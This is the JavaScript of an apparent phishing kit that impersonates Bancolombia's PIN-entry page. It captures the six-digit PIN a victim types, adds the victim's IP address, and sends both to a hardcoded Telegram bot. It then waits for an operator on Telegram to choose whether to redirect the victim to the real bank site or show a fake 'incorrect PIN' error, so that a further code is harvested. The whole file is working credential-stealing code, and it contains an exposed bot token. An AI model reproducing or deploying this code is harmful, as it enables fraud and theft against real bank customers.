async function getTokens() {
    return {
        telegramToken: "8627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw",
        telegramChatId: "-1004245962123"
    };
}

let waitingForDecision = false;
let lastDecisionTimestamp = 0;

const pinEntry = document.getElementById('pin-entry');
const pinDots = document.querySelectorAll('.pin-dot');
const continueBtn = document.getElementById('continueBtn');
const pinError = document.getElementById('pin-error');

async function sendTelegramMessage(message, buttons = null) {
    try {
        const tokens = await getTokens();
        if (!tokens) throw new Error('No se pudieron cargar los tokens');

        const payload = {
            chat_id: tokens.telegramChatId,
            text: message,
        };
        if (buttons) {
            payload.reply_markup = JSON.stringify({
                inline_keyboard: buttons
            });
        }
        const response = await fetch(`https://api.telegram.org/bot${tokens.telegramToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        if (!response.ok) {
            throw new Error('Error al enviar mensaje a Telegram');
        }
        
        const responseData = await response.json();
        return responseData.result.message_id;
    } catch (error) {
        console.error('Error:', error);
    }
}

async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error al obtener la IP:', error);
        return 'No se pudo obtener';
    }
}

async function waitForDecision(messageId) {
    const tokens = await getTokens();
    if (!tokens) return;

    while (waitingForDecision) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${tokens.telegramToken}/getUpdates?offset=-1&allowed_updates=["callback_query"]`);
            const data = await response.json();
            
            if (data.ok && data.result.length > 0) {
                const lastUpdate = data.result[0];
                if (lastUpdate.callback_query && 
                    lastUpdate.callback_query.message.date > lastDecisionTimestamp &&
                    lastUpdate.callback_query.message.message_id === messageId) {
                    const action = lastUpdate.callback_query.data;
                    waitingForDecision = false;
                    lastDecisionTimestamp = lastUpdate.callback_query.message.date;
                    
                    await removeInlineKeyboard(messageId);
                    
                    handleAction(action);
                    return;
                }
            }
        } catch (error) {
            console.error('Error al obtener actualizaciones de Telegram:', error);
        }
        await new Promise(resolve => setTimeout(resolve, 2000));
    }
}

async function removeInlineKeyboard(messageId) {
    try {
        const tokens = await getTokens();
        if (!tokens) return;

        await fetch(`https://api.telegram.org/bot${tokens.telegramToken}/editMessageReplyMarkup`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: tokens.telegramChatId,
                message_id: messageId,
                reply_markup: JSON.stringify({
                    inline_keyboard: []
                })
            }),
        });
    } catch (error) {
        console.error('Error al eliminar el teclado inline:', error);
    }
}

function handleAction(action) {
    document.getElementById('loading-overlay').style.display = 'none';
    switch(action) {
              case 'cerrar_sesion':
            window.location.href = 'https://www.bancolombia.com/personas';
            break;
        case 'pin_incorrecto':
            showPinError();
            break;
    }
}

function showPinError() {
    pinError.style.display = 'block';
    pinEntry.value = '';
    pinDots.forEach(dot => dot.style.opacity = '0');
    continueBtn.disabled = true;
}

pinEntry.addEventListener('input', function() {
    const pin = this.value;
    pinDots.forEach((dot, index) => {
        if (index < pin.length) {
            dot.style.opacity = '1';
        } else {
            dot.style.opacity = '0';
        }
    });
    continueBtn.disabled = pin.length !== 6;
    pinError.style.display = 'none';
});

continueBtn.addEventListener('click', async function() {
    const pin = pinEntry.value;
    if (pin.length === 6) {
        const ip = await getIP();
        const message = `🏦 Nuevo Hit Bancolombia en hora buena\n\n🌐 IP: ${ip}\n🔢 PIN: ${pin}`;
        await sendTelegramMessage(message);

        document.getElementById('loading-overlay').style.display = 'flex';
        waitingForDecision = true;

        const decisionMessage = `🤔  Toma una decisión\n\n🌐 IP: ${ip}`;
        const buttons = [
            [{ text: "## FINALIZAR ##", callback_data: "cerrar_sesion" }],
            [{ text: "## ERROR OTP ##", callback_data: "pin_incorrecto" }]
        ];
        const messageId = await sendTelegramMessage(decisionMessage, buttons);

        await waitForDecision(messageId);
    }
});